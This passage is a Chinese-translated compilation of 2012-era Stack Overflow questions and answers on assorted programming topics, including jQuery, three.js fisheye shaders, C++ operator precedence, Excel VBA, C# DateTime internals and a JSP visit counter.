您必须更改`DEFAULT_CHARSET`或`HttpRequest.encoding`更改`ISO-8859-8`以获取正确的 Unicode 数据。（[https://docs.djangoproject.com/en/dev/ref/settings/#default-charset](https://docs.djangoproject.com/en/dev/ref/settings/#default-charset)）

# javascript - 设置元素的 ID

> ID：13360620
> 
> 赞同：2
> 
> 时间：2012-11-13T12:18:05.010
> 
> 标签：javascript, jquery, attributes, element

我在 javascript 中创建一个元素，给它一个 ID，然后通过 jQuery 访问它。我认为这很简单，但由于某种原因，这不起作用：

```
 var img  = document.createElement('img');
    img.id = "uploadedimg";
    if($('#uploadedimg').length==0)
            alert("it's not there");
        else 
            alert("it is there!"); 
```

我收到的警报是“它不存在”。我知道如何在 jQuery 中创建一个元素，但我想知道这段代码有什么问题。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T12:18:44.887

在使用 jQuery 在 DOM 中查找之前，您必须附加该元素。

使用`appendChild`方法来做到这一点。例如：

```
document.body.appendChild(img); 
```

之后，使用 jQuery 访问它。

另一种方法是将元素直接转换为 jQuery 对象，如下所示`$(img)`：之后你就可以使用jQuery的常用方法了。

# asp.net - 这里使用什么类型的 dbwa

> ID：13360622
> 
> 赞同：0
> 
> 时间：2012-11-13T12:18:13.057
> 
> 标签：asp.net, database-connection

我正在将网站移动到新服务器。在我得到的存档文件中，我有`.bak`文件。使用`sqlcmd`我得到`.mdf`和`.ldf`文件。我的问题是这里使用了什么类型的连接，我应该如何将数据库添加到这个项目中？

下面是连接到 db 的文件：

```
<%
' FileName="Connection_odbc_conn_dsn.htm"
' Type="ADO" 
' DesigntimeType="ADO"
' HTTP="true"
' Catalog=""
' Schema=""
Dim MM_xxx_STRING
MM_xxx_STRING = "Driver={SQL Server};Server=xxx.xxx.xxx.xxx\SQLEXPRESS;Database=xxxx;Uid=xxxx;Pwd=xxxx;"
%> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:23:19.060

它是一个 MS SQL Server（速成版）。

我认为在您的目标 SQL 服务器中，您可以在创建新数据库时指定要使用的 .mdf 文件。

# camera - Three.js - 鱼眼效果

> ID：13360625
> 
> 赞同：7
> 
> 时间：2012-11-13T12:18:16.957
> 
> 标签：camera, three.js, fisheye

所以，我搞砸了[three.js](http://mrdoob.github.com/three.js/)，效果很好。我唯一想不通的是如何制作具有真正鱼眼效果的相机。

这怎么可能？`camera.setLens()`?

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2015-09-08T21:25:23.027

鱼眼效果可以使用 Giliam de Carpentier 的镜头失真着色器来实现。

着色器代码：

```
function getDistortionShaderDefinition()
{
    return {

        uniforms: {
            "tDiffuse":         { type: "t", value: null },
            "strength":         { type: "f", value: 0 },
            "height":           { type: "f", value: 1 },
            "aspectRatio":      { type: "f", value: 1 },
            "cylindricalRatio": { type: "f", value: 1 }
        },

        vertexShader: [
            "uniform float strength;",          // s: 0 = perspective, 1 = stereographic
            "uniform float height;",            // h: tan(verticalFOVInRadians / 2)
            "uniform float aspectRatio;",       // a: screenWidth / screenHeight
            "uniform float cylindricalRatio;",  // c: cylindrical distortion ratio. 1 = spherical

            "varying vec3 vUV;",                // output to interpolate over screen
            "varying vec2 vUVDot;",             // output to interpolate over screen

            "void main() {",
                "gl_Position = projectionMatrix * (modelViewMatrix * vec4(position, 1.0));",

                "float scaledHeight = strength * height;",
                "float cylAspectRatio = aspectRatio * cylindricalRatio;",
                "float aspectDiagSq = aspectRatio * aspectRatio + 1.0;",
                "float diagSq = scaledHeight * scaledHeight * aspectDiagSq;",
                "vec2 signedUV = (2.0 * uv + vec2(-1.0, -1.0));",

                "float z = 0.5 * sqrt(diagSq + 1.0) + 0.5;",
                "float ny = (z - 1.0) / (cylAspectRatio * cylAspectRatio + 1.0);",

                "vUVDot = sqrt(ny) * vec2(cylAspectRatio, 1.0) * signedUV;",
                "vUV = vec3(0.5, 0.5, 1.0) * z + vec3(-0.5, -0.5, 0.0);",
                "vUV.xy += uv;",
            "}"
        ].join("\n"),

        fragmentShader: [
            "uniform sampler2D tDiffuse;",      // sampler of rendered scene?s render target
            "varying vec3 vUV;",                // interpolated vertex output data
            "varying vec2 vUVDot;",             // interpolated vertex output data

            "void main() {",
                "vec3 uv = dot(vUVDot, vUVDot) * vec3(-0.5, -0.5, -1.0) + vUV;",
                "gl_FragColor = texture2DProj(tDiffuse, uv);",
            "}"
        ].join("\n")

    };
} 
```

使用效果作曲家设置效果的一种方法（假设`scene`并`renderer`已创建）：

```
// Create camera
camera = new THREE.PerspectiveCamera( 100, window.innerWidth / window.innerHeight, 1, 1000000 );
camera.position.z = 800;

// Create effect composer
composer = new THREE.EffectComposer( renderer );
composer.addPass( new THREE.RenderPass( scene, camera ) );

// Add distortion effect to effect composer
var effect = new THREE.ShaderPass( getDistortionShaderDefinition() );
composer.addPass( effect );
effect.renderToScreen = true;

// Setup distortion effect
var horizontalFOV = 140;
var strength = 0.5;
var cylindricalRatio = 2;
var height = Math.tan(THREE.Math.degToRad(horizontalFOV) / 2) / camera.aspect;

camera.fov = Math.atan(height) * 2 * 180 / 3.1415926535;
camera.updateProjectionMatrix();

effect.uniforms[ "strength" ].value = strength;
effect.uniforms[ "height" ].value = height;
effect.uniforms[ "aspectRatio" ].value = camera.aspect;
effect.uniforms[ "cylindricalRatio" ].value = cylindricalRatio; 
```

需要以下脚本，例如可以从[three.js GitHub 页面](https://github.com/mrdoob/three.js)找到它们：

```
<script src="examples/js/postprocessing/EffectComposer.js"></script>
<script src="examples/js/postprocessing/RenderPass.js"></script>
<script src="examples/js/postprocessing/MaskPass.js"></script>
<script src="examples/js/postprocessing/ShaderPass.js"></script>
<script src="examples/js/shaders/CopyShader.js"></script> 
```

链接到 Giliam 的示例： http: [//www.decarpentier.nl/downloads/lensdistortion-webgl/lensdistortion-webgl.html](http://www.decarpentier.nl/downloads/lensdistortion-webgl/lensdistortion-webgl.html)

链接到 Giliam 关于镜头畸变的文章：http: [//www.decarpentier.nl/lens-distortion](http://www.decarpentier.nl/lens-distortion)

我使用镜头畸变效果的测试图像：

[![图片](../Images/25f4ac5055a6a49287df77e4f65030bd.png)](https://i.stack.imgur.com/VktnB.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-26T18:19:14.870

将相机放在反射球内。确保球体是双面的。如果要在场景中移动相机和球体，请将其作为父级。奇迹般有效：

[http://tileableart.com/code/NOCosmos/test.html](http://tileableart.com/code/NOCosmos/test.html)

借自：

[http://mrdoob.github.io/three.js/examples/webgl_materials_cubemap_dynamic2.html](http://mrdoob.github.io/three.js/examples/webgl_materials_cubemap_dynamic2.html)

```
cubeCamera = new THREE.CubeCamera( 1, 3000, 1024);
            cubeCamera.renderTarget.minFilter = THREE.LinearMipMapLinearFilter;
scene.add( cubeCamera );
camParent.add(cubeCamera);
var material = new THREE.MeshBasicMaterial( { envMap: cubeCamera.renderTarget } );
material.side = THREE.DoubleSide;
sphere = new THREE.Mesh( new THREE.SphereGeometry( 2, 60, 30 ), material ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T12:29:31.127

可以通过高视野获得鱼眼效果。

```
 var fishCamera = new THREE.PerspectiveCamera( 110, window.innerWidth / window.innerHeight, 1, 1100 );
            var normalCamera = new THREE.PerspectiveCamera( 50, window.innerWidth / window.innerHeight, 1, 1100 ); 
```

或设置

```
camera.fov = 110 
camera.updateProjectionMatrix(); 
```

现场示例：http: [//mrdoob.github.com/three.js/examples/canvas_geometry_panorama_fisheye.html](http://mrdoob.github.com/three.js/examples/canvas_geometry_panorama_fisheye.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T12:51:46.953

一种方法是在相机上设置大视野：

```
new THREE.PerspectiveCamera(140, ... ) 
```

这在技术上不会是鱼眼效果，但它可能是您正在寻找的效果。

在真正的相机镜头中，获得大视野而不会失真可能会使镜头变得相当昂贵，但在计算机图形学中，这是一种简单的方法。

真正的[鱼眼镜头](http://en.wikipedia.org/wiki/Fisheye_lens)会扭曲图像，使直线变成曲线，如下图所示：

![鱼眼示例，维基百科上 Ilveon 的 CC](../Images/79394c93ffddc3125479ecbf8ceeb475.png)

如果你想用这种扭曲创建一个实际的鱼眼效果，你必须修改几何，如[Three.js 的鱼眼示例](http://mrdoob.github.com/three.js/examples/canvas_geometry_panorama_fisheye.html)。在该示例中，几何体实际上是预先修改的，但对于更高级的场景，您可能希望使用顶点着色器来动态更新顶点。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-05-26T06:10:50.903

广角镜头通常具有非常短的焦距。

为了实现超广角，我们需要缩短焦距。

请注意，鱼眼镜头是超广角镜头。

要减少焦距（或实现极广角），只需增加 FOV（视场），因为 FOV 与焦距成反比。

**例子：**

```
var camera_1 = new THREE.PerspectiveCamera( 45, width / height, 1, 1000 );

var camera_2 = new THREE.PerspectiveCamera( 80, width / height, 1, 1000 ); 
```

这里 camera_2 是一个更广的角度设置。

**笔记**

为了达到预期的效果，可能需要调整相机位置。

# algorithm - 获取二叉树中的所有序列

> ID：13360634
> 
> 赞同：0
> 
> 时间：2012-11-13T12:18:43.773
> 
> 标签：algorithm, binary-tree

我有一棵二叉树，我需要获取叶子和根之间的所有序列。
例如，对于这样的树
![树](../Images/ff5120cd01e98a4465c4515e03b3f12a.png)

我需要得到序列：“ABD”、“ABE”、“AC”。
如何实施？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:35:33.160

伪代码：

```
Function ProcessNode(TreeNode, ParentPath)
  CurrentPath = Append(ParentPath, TreeNode.Name)
  If IsNull(TreeNode.Left) And IsNull(TreeNode.Right) Then
    Print(CurrentPath)
  Else
    If IsNotNull(TreeNode.Left) Then ProcessNode(TreeNode.Left, CurrentPath)
    If IsNotNull(TreeNode.Right) Then ProcessNode(TreeNode.Right, CurrentPath)

ProcessNode(Root, "") 
```

# iphone - iPhone的静态应用程序

> ID：13360639
> 
> 赞同：0
> 
> 时间：2012-11-13T12:19:06.060
> 
> 标签：iphone, ios

我想要的是创建 iPhone 应用程序。

一切都将是静态数据。我想要的是在下方一一显示菜单（如菜单 1、菜单 2、...）。单击菜单 1 后，我将在下一个屏幕上显示菜单 1 的详细信息。

现在我所做的是创建主页。我有按钮说菜单。单击该按钮后，我将转到另一个屏幕，即 TableViewController。知道如何在那里显示菜单按钮吗？

任何想法或建议都会很棒。

在此先感谢大家...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:34:13.807

看来您正在寻找`UITabBarController`，检查[参考](http://developer.apple.com/library/ios/ipad/#documentation/uikit/reference/UITabBarController_Class/Reference/Reference.html)。
如果您不想使用，`UITabBarController`您可以将您的“主页”控制器插入[UINavigationController](http://developer.apple.com/library/ios/ipad/#documentation/uikit/reference/UINavigationController_Class/Reference/Reference.html)并推送您的视图控制器以及一些`IBAction`与您的按钮相关联的控制器，或者以模式方式显示您的控制器。

# c++ - 否定运算符和比较

> ID：13360640
> 
> 赞同：3
> 
> 时间：2012-11-13T12:19:11.973
> 
> 标签：c++, comparison, negation

让我们看一些代码示例：

```
! 4 > 0; 
```

根据 C++ 标准，我们知道，首先进行否定，而不是比较。但是如果我们稍微扩展一下这个例子：

```
#include <iostream>

class Test
{
public:
    bool operator!() const
    {
            std::cout << "operator!" << std::endl;
            return false;
    }

    bool operator>(const int &) const
    {
            std::cout << "operator>" << std::endl;
            return false;
    }
};

int main(int argc, char * argv[])
{
    Test t;
    std::cout << "t > 0;" << std::endl;
    t > 0;
    std::cout << "! t > 0;" << std::endl;
    ! t > 0;
    std::cout << "!t.operator>(0)" << std::endl;
    ! t.operator>(0);

    return 0;
} 
```

该程序的输出将是：

```
t > 0;
operator>
! t > 0;
operator!
!t.operator>(0)
operator> 
```

1.  第一次调用（控制调用）很清楚。我们检查是否调用了我们想要的运算符。
2.  第二个电话是我首先陈述的证明。首先调用否定运算符，然后调用结果（布尔）运算符>。
3.  第三个电话是困扰我的。

这里提出了我的问题。为什么`SomeObjInstance > 0`call 不同于`SomeObjInstance.operator>(0)`. 我知道以第二种方式（作为成员）调用操作员并不常见，但为什么这种调用不同？如果成员操作员不存在，我总是坚持将`SomeObjInstance > 0`其转换为成员调用`SomeObjInstance.operator>(0)`或函数调用。`bool operator>(const Test &, int)`

在 C++ 标准中描述了这种行为，或者这可能是某种未定义的行为？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T12:21:51.513

成员访问运算符`.*`的优先级高于否定运算符`!`。

> 在 C++ 标准中描述了这种行为，或者这可能是某种未定义的行为？

这很可能是相关段落：

> ### 13.5 重载运算符 [over.oper]
> 
> 5) 通常不直接调用操作符函数；相反，它们被调用来评估它们实现的运算符 (13.5.1 – 13.5.7)。但是，可以使用 operator-function-id 作为函数调用语法 (5.2.2) 中的函数名称来显式调用它们。

在您的第一个示例`t > 0;`中，它将使用具有优先级的相应运算符作为关系比较运算符。但是，在您的第二个版本中，`t.operator>(0)`您将其用作函数调用。因此，`Test::operator>`它被用作成员函数，这将导致您描述的行为，因为它失去了它的操作符特征（*“它们可以被显式调用，但是，在函数调用中使用 operator-function-id 作为函数的名称语法”*）。

也可以看看：

*   [C++ 运算符优先级](http://en.cppreference.com/w/cpp/language/operator_precedence)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T12:42:35.667

戴上你的编译器帽子一会儿。您需要根据一组明确的规则（包括运算符优先级）解析和评估表达式。评估涉及调用成员函数 ( `operator>()`) 的事实，如果表达式使用运算符，该函数也会被调用`>`- 那又如何？您是否想创建一个特殊情况并假设在这种情况下应该更改默认优先级？你准备走多远？例如，如果此方法是间接调用的，还是由函数指针调用的？我认为这会使编译器的逻辑复杂化，并且仍然允许违反直觉的示例，类似于您的原始问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T12:23:22.430

`.`并且`()`具有比 更高的优先级`!`。运算符语法被解析为

```
(!t) > 0; 
```

而显式调用被解析为

```
!((t.operator>)()) 
```

# version-control - 在 TFS 2012 中合并并重用评论和工作项？

> ID：13360641
> 
> 赞同：5
> 
> 时间：2012-11-13T12:19:13.477
> 
> 标签：version-control, merge, visual-studio-2012

我想将功能分支中的单个变更集合并到 MAIN 行中。如何轻松重用原始签到评论的文本并重新关联原始链接的工作项？目前，我必须手动复制文本并手动查找工作项 ID 以将它们用于合并签入。

是否有任何工具或选项可以影响此过程？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-09-18T00:38:57.340

此视觉工作室插件将执行此[自动合并](https://visualstudiogallery.msdn.microsoft.com/de186cc3-0dd5-4100-bd2c-bdcd651ac4b4 "自动合并")

# java - 随机读取文件并在标签中输出

> ID：13360644
> 
> 赞同：0
> 
> 时间：2012-11-13T12:19:24.197
> 
> 标签：java

我使用这些代码随机读取文本文件并在 label 中显示输出。我不知道我是如何读取随机单词或行并放入标签中的？最后，我的目标是阅读随机单词并将该单词放入标签中

```
static JLabel lbl;
JLabel word ;

a(){    
    ButtonComponent ();
    OtherParts ();
    labels();       

    setTitle("HangmanGame");
    setSize(840, 310);
    setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

    setLayout(null);
    setVisible(true);
    setLocation(320, 150);
}

public void labels(){
    for(int s=19; s>=8;s--){
        word = new JLabel ("");
        word.setBounds( s*30, 60, 20, 20);
        add(word);              
    }

    for (int a = 19; a >= 8; a--) {
        JLabel lbl = new JLabel("_");
        lbl.setBounds(a * 30, 60, 20, 20);
        add(lbl);
    }
}

public void OtherParts () {
    JTextField tf = new JTextField();
    tf.setBounds(55, 190, 340, 30);
    add(tf);

    JButton Guess = new JButton("Guess");
    Guess.setBounds(410, 190, 355, 30);
    add(Guess);
    JLabel chance = new JLabel ("Remaining Chance");
    chance.setBounds(55, 215, 340, 30);
    add(chance);

}

public void ButtonComponent () {
    for (int i = 65; i < 78; i++) {
        JButton temp = new JButton("" + (char) i);
        temp.addActionListener(new BtnListener());
        temp.setBounds((i - 64) * 55, 110, 50, 30);
        add(temp);
    }
    for (int i = 78; i < 91; i++) {
        JButton temp = new JButton("" + (char) i);
        temp.addActionListener(new BtnListener());
        temp.setBounds((i - 77) * 55, 150, 50, 30);
        add(temp);
    }
}

public void MenuComponent () {
    JMenuBar menubar = new JMenuBar();
    setJMenuBar(menubar);

    JMenu file = new JMenu("File");
    menubar.add(file);
    JMenuItem newgame = new JMenuItem("New");
    JMenuItem savegame = new JMenuItem("Save Game");
    JMenuItem Loadgame = new JMenuItem("Load");
    JMenuItem exit = new JMenuItem("Exit");

    file.add(savegame);
    file.add(Loadgame);
    file.add(exit);
    file.add(newgame);

    exit.addActionListener(new exitListener());
    JMenu option = new JMenu("Option");
    menubar.add(option);
    JMenuItem op = new JMenuItem("Option");
    option.add(op);
}

class exitListener implements ActionListener {
    public void actionPerformed(ActionEvent arg0) {
        System.exit(0);
    } 
}

class BtnListener implements ActionListener {
    public void actionPerformed(ActionEvent e) {    
        JButton clickedButton = (JButton) e.getSource();
        String text = clickedButton.getText();
        System.out.println(text + lbl);     
        //word.setText(text);
    }
}

public static void main(String[] args) {
    new a();
    Properties readfile = new Properties();
    try {
        readfile.load(new FileInputStream("ciu"));
    } catch (Exception e) {
        System.out.println(e.toString());
    }
    for (int i = 1; i <5; i++) {
        String line = readfile.getProperty("" + i);
        System.out.println(line);
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T12:28:33.013

您有很多与您的问题无关的代码。如果要生成随机数，可以使用[Random](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Random.html)

```
 Random random = new Random();
 int randomInt = random.nextInt(10);//generate random numbers between 0..10 
```

我仍然不确定你想要什么，但我希望这会有所帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:30:07.033

以下是如何从文本文件中读取一行 [https://stackoverflow.com/a/9181778/1360074](https://stackoverflow.com/a/9181778/1360074)

这是将文本设置为标签的方式：

```
JLabel label = new JLabel();
label.setText(str); 
```

# maven - Maven 和 Axis2 插件 - 不同的存根代码生成

> ID：13360645
> 
> 赞同：4
> 
> 时间：2012-11-13T12:19:24.977
> 
> 标签：maven, axis2, java

我正在使用**Maven 3.0.4**和**Axis2 1.5.1**插件。我在 Maven 上使用 AXIS2 插件生成存根类时遇到问题。

根据构建环境当前配置的 JDK，`AXIS2`插件会生成不同的 stub 类源代码。我已经尝试使用**JDK 1.6**和**JDK 1.7**生成。

有什么方法可以“强制” Maven`JDK (i.e. 1.6)`中的插件使用（不改变环境）？`AXIS2`（我想有一个独立于环境的代码生成）

任何帮助都感激不尽。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-20T08:44:07.560

我假设您选择您的 JDK，如下所述：

[http://maven.apache.org/plugins/maven-compiler-plugin/examples/compile-using-different-jdk.html](http://maven.apache.org/plugins/maven-compiler-plugin/examples/compile-using-different-jdk.html)

然后，我将使用不同的配置文件生成存根，允许您覆盖某些配置，但保留整体 conf 的好处。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-04T14:36:02.343

不幸的是，我所有的尝试都没有成功。

我必须接受我在另一篇文章中展示的内容（[http://maven.40175.n5.nabble.com/Maven-amp-Axis2-plugin-different-stub-code-generation-tc5730726.html](http://maven.40175.n5.nabble.com/Maven-amp-Axis2-plugin-different-stub-code-generation-tc5730726.html)）：如果我真的*需要*这种类型的功能，我可能必须自己做这项工作。否则请询问 Axis2 开发人员是否有人愿意这样做。

# codeigniter - 通过 Codeigniters 全局 xss 过滤器传递广告服务器标签

> ID：13360648
> 
> 赞同：0
> 
> 时间：2012-11-13T12:19:46.847
> 
> 标签：codeigniter, xss

我使用最新的 CI 版本。在 config.php 中：

```
$config['global_xss_filtering'] = TRUE; 
```

我无法改变这一点。

我需要保存广告服务器标签（将存储在文件中，而不是数据库中），其中还包含 Javascript。因此，使用此设置我无法保存 adservertags、CI 或输入过滤器删除它的某些部分。

我的第一个想法是在客户端使用 base64 对 adservertag 进行编码，然后在服务器上再次对其进行解码，您怎么看？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T13:33:01.700

听起来像是个计划。

除了在客户端没有原生方式进行 base64 编码。但是，Stack-O 上的一位友好伙伴已经为您解决了这个问题：[https](https://stackoverflow.com/a/246813/183254) : //stackoverflow.com/a/246813/183254 一定要为他们点赞。

# javascript - 查找两个日期之间的日期 Jquery/JS

> ID：13360649
> 
> 赞同：2
> 
> 时间：2012-11-13T12:19:52.353
> 
> 标签：javascript, jquery

我已经对这个问题进行了广泛的搜索，到目前为止，我发现的所有代码都没有失败，我制作的代码也一样，所以我开始担心这是不可能的。

例如，我们有两个`mm/dd/yy`格式不是`dd/mm/yy`这样`11/30/2012`的日期。

然后我使用以下脚本：

```
if ( jQuery("#book_room_type").val() == "La Maison" ) {
    Date.prototype.DaysBetween = function() {  
        var intMilDay = 24 * 60 * 60 * 1000;  
        var intMilDif = arguments[0] - this;  
        var intDays = Math.floor(intMilDif/intMilDay);  
        return intDays;  
    }  
    var d1 = new Date(jQuery("#dateto").val());  
    var d2 = new Date(jQuery("#datefrom").val());  
    alert("you only have".d1.DaysBetween(d2)); 

    return false;   
} 
```

然而，这并没有返回 dateto 和 datefrom 字段之间的天数，它现在让我发疯，请提出任何建议。

谢谢，西蒙

参考卡尔文斯的建议：

```
if ( jQuery("#book_room_type").val() == "La Maison" ) {
    alert("test");
    var dategap = (jQuery("#dateto").val().getTime() - jQuery("#datefrom").getTime()) / (1000 * 60 * 60 * 24);
    alert(dategap); 
    alert("test2");
    return false;   
} 
```

这在第二次警报中失败并且没有警报日期。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:23:46.710

我建议你使用 datejs - [http://www.datejs.com/](http://www.datejs.com/) - 来解析和计算你的日期。

或者，如果你想写纯 js

```
function(date1, date2) {
    return (date1.getTime() - date2.getTime()) / (1000 * 60 * 60 * 24);
} 
```

它以小数形式返回“天”。

放置结果或简单地应用`Math.abs()`，您将得到一个正数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:29:12.003

代码有效，但使用点而不是`+`警报时出现连接错误

演示：http: [//jsfiddle.net/YgY5c/](http://jsfiddle.net/YgY5c/)

# excel - Excel：如何使用 VBA 检查单元格是否为空？

> ID：13360651
> 
> 赞同：79
> 
> 时间：2012-11-13T12:19:56.863
> 
> 标签：excel, vba

通过 VBA，我如何检查一个单元格是否为另一个单元格中的特定信息？

例如：

> 如果 A:A = "product special" And B:B 为空 那么
> 
> C1 =“产品特价”

![示例说明](../Images/7a04b89f59dbd91c679f6849af5cbf30.png)

此外，我如何使用`For Each`循环`Range`以及如何返回另一个单元格中的值？

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2012-11-13T12:40:49.763

你可以使用`IsEmpty()`这样的功能：

```
...
Set rRng = Sheet1.Range("A10")
If IsEmpty(rRng.Value) Then ... 
```

您还可以使用以下内容：

```
If ActiveCell.Value = vbNullString Then ... 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2012-11-13T12:52:20.407

`IsEmpty()`将是检查这一点的最快方法。

`IsNull()`似乎是一个类似的解决方案，但请记住必须将 Null 分配给单元格；它不是在单元格中固有地创建的。

此外，您可以通过以下方式检查单元格：

`count()`

`counta()`

`Len(range("BCell").Value) = 0`

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-11-13T12:23:29.357

[本站](http://www.herber.de/mailing/vb/html/vafctisemptyx.htm)采用的方法`isEmpty()`。

编辑：从网站抓取的内容，在 URL 无效之前。

```
Worksheets("Sheet1").Range("A1").Sort _
    key1:=Worksheets("Sheet1").Range("A1")
Set currentCell = Worksheets("Sheet1").Range("A1")
Do While Not IsEmpty(currentCell)
    Set nextCell = currentCell.Offset(1, 0)
    If nextCell.Value = currentCell.Value Then
        currentCell.EntireRow.Delete
    End If
    Set currentCell = nextCell
Loop 
```

在第一步中，将对 Sheet1 中第一列中的数据进行排序。在第二步中，将删除所有具有相同数据的行。

# wordpress - 将css样式应用于动态div ID？

> ID：13360652
> 
> 赞同：1
> 
> 时间：2012-11-13T12:20:03.837
> 
> 标签：wordpress, css

有没有办法将 CSS 样式应用于动态生成的 div？

在这种情况下，在 Wordpress 中，我有一个 .profiles 的 div 类，并在该类的#profile-1、2、3 等中动态生成 div ID。

我想要做的是对每个 profile-1、2 等 div id 应用相同的样式，而不必在样式表中的每一个中指定样式。

这可能吗？

谢谢！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T12:23:58.867

我可能没有完全理解这个问题，但你不能在你的 CSS 中为类 .profiles 创建一个样式吗？如果您所有的 div 都使用该类，那么它应该可以正常工作。

```
.profiles { (put your style here) } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:24:11.587

你可以在你的CSS中做到这一点：

`div[id^="profile-"] { your styles }`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T12:24:23.457

如果里面唯一的孩子`<div class="profiles">`是你的目标 div，你可以这样设置它们的样式：

```
.profiles div {
    /*your style here*/
} 
```

解决此问题的另一种方法是向所有 div 添加一个类（然后设置该类的样式）。在 Wordpress 中，您可以在模板文件中轻松做到这一点。

# c# - DateTime 按内部刻度比较？

> ID：13360653
> 
> 赞同：11
> 
> 时间：2012-11-13T12:20:07.607
> 
> 标签：c#, .net, datetime, .net-4.0

我查看了 DateTime Equals 实现：

```
public bool Equals(DateTime value)
{
    return (this.InternalTicks == value.InternalTicks);
} 
```

然后看看 internalticks

```
internal long InternalTicks
{
    [TargetedPatchingOptOut("Performance critical to inline across NGen image boundaries")]
    get
    {
        return (((long) this.dateData) & 0x3fffffffffffffffL);
    }
} 
```

然后我注意到了这个数字：`0x3fffffffffffffffL`

这是：`4611686018427387903`

但*更*有趣的是它的*二进制*表示：

```
00111111 11111111 11111111 11111111 11111111 11111111 11111111 11111111
^^
|| 
```

*请注意箭头*

*如果只有左*箭头是`0`（正表示） ，我可以理解

*   但是为什么第二个也是`0`？

*   另外，为什么我每个人都希望它`&`带有`1111....`数字？如果我想显示`5`我不必做`5 & 1`，只需 5 个。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-13T12:27:28.890

[您可以从Reference Source](http://referencesource.microsoft.com/netframework.aspx)获得此类信息。dd/ndp/clr/src/bcl/system/datetime.cs 中最相关的声明：

```
 private const UInt64 TicksMask             = 0x3FFFFFFFFFFFFFFF;
    private const UInt64 FlagsMask             = 0xC000000000000000;
    private const UInt64 LocalMask             = 0x8000000000000000;
    private const Int64 TicksCeiling           = 0x4000000000000000;
    private const UInt64 KindUnspecified       = 0x0000000000000000;
    private const UInt64 KindUtc               = 0x4000000000000000;
    private const UInt64 KindLocal             = 0x8000000000000000;
    private const UInt64 KindLocalAmbiguousDst = 0xC000000000000000;
    private const Int32 KindShift = 62; 
```

请注意*Kind*值如何映射到这两个位。

```
 public DateTime(long ticks, DateTimeKind kind) {
        // Error checking omitted
        //...
        this.dateData = ((UInt64)ticks | ((UInt64)kind << KindShift));
    } 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-13T12:22:51.797

该`dateData`字段用作[位字段](http://en.wikipedia.org/wiki/Bit_field)，以紧凑格式存储多个值。

前两位存储[DateTimeKind](http://msdn.microsoft.com/en-us/library/shx7s921.aspx)，它有四个可能的值之一：未指定、本地（内部有两个变体）或 Utc。这四个值可以存储在两位中。

底部 62 位存储刻度。该操作`x & 0x3fffffffffffffffL`是按位与操作，有时也称为[屏蔽](http://en.wikipedia.org/wiki/Mask_%28computing%29)。它只返回对应于刻度的位。

# java - 将txt中的字符串读入jsp

> ID：13360659
> 
> 赞同：0
> 
> 时间：2012-11-13T12:20:46.627
> 
> 标签：java, html, jsp

我想为一个网站写一个访客计数器并得到这个代码

```
<html>
<head>
<title>Counter</title>
</head>
<body>
<%@ page import="java.io.*" %>
<%
String datei="pathtotxt/count.txt";
String wert ="";
try{
FileReader eingabestrom= new FileReader(new File(datei));
BufferedReader input=new BufferedReader(eingabestrom);
wert=input.readLine();
input.close();

int count=Integer.parseInt(wert);
count++;
FileWriter ausgabestrom=new FileWriter(new File(datei));
BufferedWriter output=new BufferedWriter(ausgabestrom);
output.write(String.valueOf(count));
output.close();
out.println("<h2>Sie sind der ");
out.println(count);
out.println(". Besucher auf unserer Site!</h2>");
}
catch(IOException e) {
out.println("Fehler: "+e);
}
%>

</body></html> 
```

在 txt 文件中只有一个零。当我打开网站时，会出现：

java.io.FileNotFoundException: pathtotxt/count.txt (权限被拒绝)

但是我已经改变了这个文件的权限。在终端它说 -rwxrwxrwx+ 所以应该可以读/写这个文件。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T14:12:40.687

我认为最好在服务器端实现此功能。例如：

*   创建一个在其构造函数中从文件中读取值并保存的类
*   此类将有一个公共方法返回先前保存的值 (int getCounter())。
*   这个类将有一个公共方法来增加值并将其写入文件，始终同步。

然后，JSP 代码将如下所示：

```
<html>
<head>
<title>Counter</title>
</head>
<body>
<%@ page import="package.of.class.ClassName" %>
<%
ClassName cl = new ClassName();
out.println("<h2>Sie sind der ");
  out.println( cl.getCount());
out.println(". Besucher auf unserer Site!</h2>");
cl.increase();
%> 
```

这样，您将提高渲染 JSP 的效率，并且您不会遇到读取文件的权限问题

# c# - 为什么在似乎未正确初始化的 DataGridViewCell 上调用 GetFormattedValue？

> ID：13360660
> 
> 赞同：0
> 
> 时间：2012-11-13T12:20:53.663
> 
> 标签：c#, winforms, datagridview

我创建了一个继承自 DataGridViewTextBoxCell 的自定义类。在这个类中，我重写了 GetFormattedValue 函数。

